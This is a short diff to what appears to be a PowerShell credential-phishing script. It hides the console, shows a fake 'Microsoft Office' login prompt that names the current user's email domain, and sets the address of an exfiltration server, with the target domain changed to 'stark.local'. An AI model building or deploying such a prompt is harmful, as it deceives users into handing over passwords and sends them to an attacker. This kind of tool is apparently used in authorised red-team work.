@@ -23,11 +23,11 @@ Hide-Console
 
 
 # EXFILL ADDRESS (PLEASE EDIT THIS!!)
-$exfilServer = "192.168."111.10"
+$exfilServer = "192.168.111.10"
 
 # prompt
 $targetUser = $env:username
-$companyEmail = "contoso.com"
+$companyEmail = "stark.local"
 $promptCaption = "Microsoft Office"
 $promptMessage = "Connecting to: $targetUser@$companyEmail"
 $maxTries = 1 # maximum number of times to invoke prompt
